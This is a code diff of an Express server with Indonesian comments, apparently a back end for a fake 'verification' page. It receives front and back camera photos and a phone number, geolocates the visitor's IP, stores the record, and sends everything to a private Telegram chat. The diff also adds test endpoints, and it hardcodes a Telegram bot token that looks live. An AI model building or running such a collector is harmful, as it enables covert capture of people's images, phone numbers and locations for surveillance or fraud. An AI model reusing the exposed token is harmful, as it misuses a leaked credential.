@@ -1,4 +1,3 @@
-require('dotenv').config();
 const express = require('express');
 const fetch = require('node-fetch');
 const FormData = require('form-data');
@@ -7,15 +6,25 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
-const CHAT_ID = '-1001234567890'; // Ganti dengan chat ID tujuan
+
+// Ambil dari environment variable Railway
+const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
+const CHAT_ID = process.env.CHAT_ID || '7352381955';
+
+console.log('🚀 ========================================');
+console.log('🚀 Server starting on Railway');
+console.log('🚀 ========================================');
+console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
+console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
+console.log(`🌐 PORT: ${PORT}`);
+console.log('🚀 ========================================');
 
 // Middleware
 app.use(express.json({ limit: '20mb' }));
 app.use(express.urlencoded({ extended: true, limit: '20mb' }));
 app.use(express.static('public'));
 
-// Database
+// Database (gunakan file, Railway support)
 const DB_PATH = path.join(__dirname, 'data.json');
 
 function readDatabase() {
@@ -56,10 +65,35 @@ async function getLocationFromIp(ip) {
   return 'Tidak diketahui';
 }
 
+// Send message to Telegram
+async function sendTelegramMessage(chatId, text) {
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    console.log('📤 Sending message to:', chatId);
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+    const data = await response.json();
+    console.log('📨 Message response:', data.ok ? '✅ Success' : '❌ Failed');
+    return data;
+  } catch (err) {
+    console.error('Send message error:', err);
+    return null;
+  }
+}
+
 // Webhook untuk bot Telegram
 app.post('/webhook', async (req, res) => {
   try {
     const { message } = req.body;
+    console.log('📨 Webhook received');
     
     if (message && message.text === '/info') {
       const chatId = message.chat.id;
@@ -88,28 +122,37 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// Send message to Telegram
-async function sendTelegramMessage(chatId, text) {
+// TEST endpoint untuk cek bot
+app.get('/test-bot', async (req, res) => {
+  console.log('🧪 Testing bot connection...');
   try {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'Markdown'
-      })
-    });
-    return await response.json();
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+    const response = await fetch(url);
+    const data = await response.json();
+    console.log('🤖 Bot info:', data.ok ? '✅ Success' : '❌ Failed');
+    res.json(data);
   } catch (err) {
-    console.error('Send message error:', err);
+    console.error('❌ Bot test error:', err);
+    res.status(500).json({ error: err.message });
   }
-}
+});
+
+// TEST send message
+app.get('/test-send', async (req, res) => {
+  console.log('🧪 Testing send message...');
+  try {
+    const result = await sendTelegramMessage(CHAT_ID, '🧪 Test message from Railway server!');
+    res.json(result);
+  } catch (err) {
+    console.error('❌ Send test error:', err);
+    res.status(500).json({ error: err.message });
+  }
+});
 
 // Verify endpoint
 app.post('/api/verify', async (req, res) => {
-  console.log('📸 Received verify request');
+  console.log('📸 ===== NEW VERIFICATION REQUEST =====');
+  console.log('📸 Time:', new Date().toISOString());
   
   try {
     let image, backImage, phone;
@@ -128,7 +171,8 @@ app.post('/api/verify', async (req, res) => {
     }
     
     console.log(`📱 Phone: ${phone}`);
-    console.log(`📸 Image length: ${image ? image.length : 'null'}`);
+    console.log(`📸 Image exists: ${!!image}`);
+    console.log(`📸 Image length: ${image ? image.length : 0}`);
     console.log(`📸 Back image: ${backImage ? 'Yes' : 'No'}`);
     
     if (!image) {
@@ -146,6 +190,11 @@ app.post('/api/verify', async (req, res) => {
     console.log(`📍 Location: ${location}`);
     console.log(`🕒 Time: ${timestamp}`);
     
+    // Process front image
+    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
+    const buffer = Buffer.from(base64Data, 'base64');
+    console.log(`📸 Front image size: ${buffer.length} bytes`);
+    
     // Save to database
     const db = readDatabase();
     db.users.push({
@@ -158,13 +207,19 @@ app.post('/api/verify', async (req, res) => {
     writeDatabase(db);
     console.log('💾 Data saved to database');
     
-    // Process front image
-    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
-    const buffer = Buffer.from(base64Data, 'base64');
-    console.log(`📸 Front image size: ${buffer.length} bytes`);
+    // ===== SEND TO TELEGRAM =====
+    console.log('📤 Sending to Telegram...');
+    console.log(`🤖 Using BOT_TOKEN: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'NOT SET'}`);
+    console.log(`📱 Using CHAT_ID: ${CHAT_ID}`);
     
-    // Send to Telegram - FRONT CAMERA
-    console.log('📤 Sending front camera to Telegram...');
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.error('❌ BOT_TOKEN or CHAT_ID not set!');
+      return res.status(500).json({ 
+        success: false, 
+        error: 'BOT_TOKEN or CHAT_ID not configured' 
+      });
+    }
+    
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', 
@@ -186,15 +241,18 @@ app.post('/api/verify', async (req, res) => {
     });
     
     const tgData = await tgResponse.json();
-    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
+    console.log('📨 Telegram response status:', tgResponse.status);
+    console.log('📨 Telegram response ok:', tgData.ok);
     
     if (!tgData.ok) {
-      console.error('❌ Telegram error:', tgData);
+      console.error('❌ Telegram error:', JSON.stringify(tgData, null, 2));
       return res.status(500).json({ 
         success: false, 
-        error: 'Gagal kirim ke Telegram: ' + JSON.stringify(tgData)
+        error: 'Gagal kirim ke Telegram: ' + (tgData.description || 'Unknown error')
       });
     }
+    
+    console.log('✅ Front photo sent successfully!');
     
     // If back camera image exists, send it too
     if (backImage) {
@@ -226,11 +284,12 @@ app.post('/api/verify', async (req, res) => {
       console.log('📨 Back camera response:', backData.ok ? '✅ Success' : '❌ Failed');
     }
     
-    console.log('✅ Process completed successfully');
+    console.log('✅ ===== PROCESS COMPLETED =====');
     res.json({ success: true });
     
   } catch (err) {
     console.error('❌ Verify error:', err);
+    console.error('❌ Error stack:', err.stack);
     res.status(500).json({ 
       success: false, 
       error: err.message || 'Terjadi kesalahan server' 
@@ -238,10 +297,20 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
+// Root endpoint
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 // Start server
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`🚀 ========================================`);
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📱 Bot token: ${BOT_TOKEN.substring(0, 10)}...`);
-  console.log(`📊 Webhook: http://localhost:${PORT}/webhook`);
-  console.log(`✅ Server is ready to receive photos!`);
+  console.log(`🚀 ========================================`);
+  console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
+  console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
+  console.log(`🚀 ========================================`);
+  console.log(`📊 Test bot: https://your-app.railway.app/test-bot`);
+  console.log(`📊 Test send: https://your-app.railway.app/test-send`);
+  console.log(`🚀 ========================================`);
 });
